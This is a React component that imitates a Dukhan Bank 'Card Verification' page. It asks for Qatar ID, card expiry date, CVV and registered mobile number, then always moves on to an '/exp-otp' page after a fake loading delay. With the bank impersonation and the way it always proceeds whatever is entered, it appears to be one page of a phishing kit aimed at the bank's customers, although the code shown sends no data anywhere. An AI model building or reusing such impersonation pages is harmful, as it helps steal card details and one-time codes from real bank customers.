import React, { useState } from "react";
import { Globe, HelpCircle, Loader2 } from "lucide-react";
import { useNavigate } from "react-router-dom";
import Logo from "@/assets/logo.png";

const EXPIRY = () => {
  const navigate = useNavigate();

  const [qatarID, setQatarId] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [mobile, setMobile] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      navigate("/exp-otp"); // ✅ Always go to next page
    }, 1500);
  };

  // 🔥 Expiry date auto-format (MM/YY)
  const handleExpiryChange = (e) => {
    let value = e.target.value.replace(/\D/g, ""); // remove non-numeric
    if (value.length > 4) value = value.slice(0, 4);

    if (value.length >= 3) {
      value = value.slice(0, 2) + "/" + value.slice(2);
    }
    setExpiryDate(value);
  };

  return (
    <div className="min-h-[90vh] flex flex-col bg-gray-50 p-6">
      {/* Top Bar */}
      <div className="flex justify-between w-full max-w-sm mb-4 text-gray-500">
        <HelpCircle className="w-6 h-6" />
        <Globe className="w-6 h-6" />
      </div>

      {/* Logo */}
      <div className="flex flex-col items-center">
        <img src={Logo} alt="Dukhan Bank" className="h-12 mb-2" />
      </div>

      {/* Form */}
      <div className="w-full max-w-sm mt-6">
        <h2 className="text-xl font-semibold mb-2 text-center">Card Verification</h2>
        <p className="text-gray-600 text-sm mb-6 text-center">
          Enter your details to continue
        </p>

        {/* Qatar ID */}
        <div className="mb-4">
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Qatar ID
          </label>
          <input
            type="text"
            placeholder="Enter your Qatar ID"
            value={qatarID}
            onChange={(e) => setQatarId(e.target.value)}
            className="w-full p-3 border rounded-full bg-white focus:outline-none focus:ring-2 focus:ring-blue-400"
          />
        </div>

        {/* Expiry Date & CVV in same row */}
        <div className="flex gap-3 mb-4">
          <div className="flex-1">
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Expiry Date (MM/YY)
            </label>
            <input
              type="text"
              placeholder="12/12"
              value={expiryDate}
              onChange={handleExpiryChange}
              maxLength={5}
              className="w-full p-3 border rounded-full bg-white focus:outline-none focus:ring-2 focus:ring-blue-400"
            />
          </div>
          <div className="w-24">
            <label className="block text-sm font-medium text-gray-700 mb-1">
              CVV
            </label>
            <input
              type="password"
              placeholder="123"
              value={cvv}
              onChange={(e) => setCvv(e.target.value)}
              maxLength={3}
              className="w-full p-3 border rounded-full bg-white focus:outline-none focus:ring-2 focus:ring-blue-400"
            />
          </div>
        </div>

        {/* Mobile Number */}
        <div className="mb-6">
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Registered Mobile Number
          </label>
          <input
            type="text"
            placeholder="Enter your mobile number"
            value={mobile}
            onChange={(e) => setMobile(e.target.value)}
            className="w-full p-3 border bg-white rounded-full focus:outline-none focus:ring-2 focus:ring-blue-400"
          />
        </div>

        {/* Submit Button */}
        <button
          onClick={handleSubmit}
          disabled={loading}
          className="w-full bg-blue-600 text-white py-3 rounded-full font-semibold flex items-center justify-center disabled:bg-gray-300"
        >
          {loading ? <Loader2 className="animate-spin w-5 h-5" /> : "Submit"}
        </button>
      </div>
    </div>
  );
};

export default EXPIRY;
